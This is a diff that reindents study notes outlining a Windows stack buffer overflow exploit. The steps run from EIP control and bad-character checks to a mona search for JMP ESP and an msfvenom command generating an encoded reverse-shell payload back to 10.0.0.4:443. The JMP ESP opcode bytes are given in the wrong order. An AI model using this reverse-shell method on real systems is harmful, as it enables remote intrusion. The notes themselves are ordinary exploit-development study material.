@@ -32,44 +32,40 @@ Step 2 Control the EIP address
    
 Step 3 Locating Space and prepare the shellCode
 
-  Finding the ESP addess 
-  
-  buffer = "A" * 2606 + "B" * 4 + "C" * (3500 – 2606 - 4)
+    Finding the ESP addess 
+    buffer = "A" * 2606 + "B" * 4 + "C" * (3500 – 2606 - 4)
   
   Program: 2-controlling-eip.py
 
 Step 4 Check Bad Characters
 
-  Send \x01...\xff to the system and check which char(s) have been truncated
-  
-  Program: 3-controlling-eip.py
+    Send \x01...\xff to the system and check which char(s) have been truncated
+    Program: 3-controlling-eip.py
   
 
 Step 5 check any memory protections such as DEP adn ASLR
-
-  Immunity Debugger Command: !mona modules
+    
+    Immunity Debugger Command: !mona modules
   
 
 Step 6 Locate the JMP ESP
 
-  /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
+    /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
   
-  JMP ESP address => \xe4\xff
+    JMP ESP address => \xe4\xff
   
   Immunity Debugger Command: !mona find -s "\xe4\xff" -m <program name>
   
   
 Step 7 Generating ShellCode using Metasploit
 
-  Metasploit Command: msfvenom -l payloads
+    Metasploit Command: msfvenom -l payloads
   
-  Metasploit Command: msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.4 LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d"
+    Metasploit Command: msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.4 LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d"
   
-  -f format
-  
-  -e encode
-  
-  -b exclude character 
+    -f format
+    -e encode
+    -b exclude character 
  
  Step 8 Sending the ShellCode 
  
